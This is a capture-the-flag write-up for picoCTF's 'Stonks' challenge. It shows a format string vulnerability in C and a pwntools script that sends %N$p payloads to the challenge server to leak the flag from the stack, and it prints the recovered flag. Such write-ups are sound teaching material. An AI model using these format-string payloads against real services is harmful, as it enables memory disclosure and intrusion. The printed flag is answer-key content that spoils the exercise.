# [Stonks](https://play.picoctf.org/practice/challenge/105?originalEvent=34&page=1)
<div style="background-image: linear-gradient(to bottom left,#fd5d93,#ec250d,#fd5d93);margin-right:75%; padding-left:2%;border-radius: .4285rem; color:white">Category:  Binary Exploitation</div>

#### AUTHOR: MADSTACKS

### Description 

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/7e71fc0d8cc3339bfad6bf408f7dc510/vuln.c) ``$ nc mercury.picoctf.net 6989``


### Method

We can see from the source code that if we choose to buy stonks, we are able to enter a string which is used as the format string for ``printf``.

```sh

printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);

```
This is vulnerable to a format string attack.

We can automate the attack using the following script:

```python

from pwn import *

flag = b''
for i in range(15, 25):
    with context.local(log_level = "error"):
        r = remote("mercury.picoctf.net", 16439)
        r.sendlineafter("What would you like to do?\n", "1")
        r.sendlineafter("What is your API token?\n", f"%{i}$p")
        r.recvuntilS("Buying stonks with token:\n")
        out = r.recvline()
        try:
            res = p32(int(out.decode(), 16))
            flag += res
        except Exception:
            pass
        r.recvall()

print(flag)

```

```sh

┌──(callummason㉿MARVIN)-[/mnt/…/CTF/picoCTF/2021/Stonks]
└─$ python3 vuln.py 
b'picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}\x00\xab\xff'

```



### Flags


#### ***** picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae} ****